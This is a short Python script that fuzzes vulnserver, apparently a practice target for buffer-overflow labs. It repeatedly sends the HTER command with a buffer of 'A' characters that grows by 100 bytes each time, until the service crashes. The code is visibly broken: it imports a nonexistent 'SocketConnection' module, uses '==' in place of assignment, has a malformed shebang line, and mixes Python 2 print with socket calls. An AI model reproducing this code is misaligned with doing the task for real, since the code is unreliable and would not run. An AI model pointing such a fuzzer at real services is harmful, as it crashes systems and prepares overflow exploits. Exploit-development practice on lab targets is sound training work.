#!usr/bin/env python3

import sys, SocketConnection
from time import sleep

# need to specifie good ip address
host = "127.0.0.1"
# default port of vulnserver
port = 9999

buffer = "A" * 100

while True:
    try:
        s == socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        s.send(('HTER /.:/' + buffer))
        s.close()
        sleep(1)
        buffer = buffer + "A" * 100

    except:
        print "Fuzzing crashed at %s bytes" % str(len(buffer))
        sys.exit()